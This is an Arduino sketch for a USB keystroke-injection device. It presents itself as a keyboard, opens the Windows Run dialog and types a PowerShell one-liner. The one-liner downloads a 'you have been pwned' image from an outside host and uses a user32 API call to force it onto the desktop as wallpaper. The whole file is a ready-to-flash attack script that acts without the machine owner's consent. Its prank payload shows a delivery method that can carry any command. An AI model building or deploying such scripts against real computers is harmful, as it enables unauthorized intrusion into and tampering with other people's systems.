#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(500);

  openRunDialog();
  typeText("powershell");
  sendEnter();
  delay(1000);

  typeText("Invoke-WebRequest \"https://c7.alamy.com/comp/2HWXA10/you-have-been-pwned-message-on-hacked-computer-screen-with-glitch-effect-modern-2d-illustration-2HWXA10.jpg\" -OutFile \"$env:TEMP\\hoff.jpg\"; Add-Type -TypeDefinition 'using System.Runtime.InteropServices;public class W{[DllImport(\"user32.dll\")]public static extern int SystemParametersInfo(int u, int v, string s, int f);}' ; [W]::SystemParametersInfo(20,0,\"$env:TEMP\\hoff.jpg\",3)");
  sendEnter();

  //delay(1000);
  //typeText("exit");
  sendEnter();

  Keyboard.end();
}

void loop() {
  // No loop actions required
}

void sendEnter() {
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.release(KEY_RETURN);
  delay(500);
}

void openRunDialog() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(500);
  Keyboard.releaseAll();
  delay(500);
}

void typeText(const char *text) {
  Keyboard.print(text);
  delay(500);
}
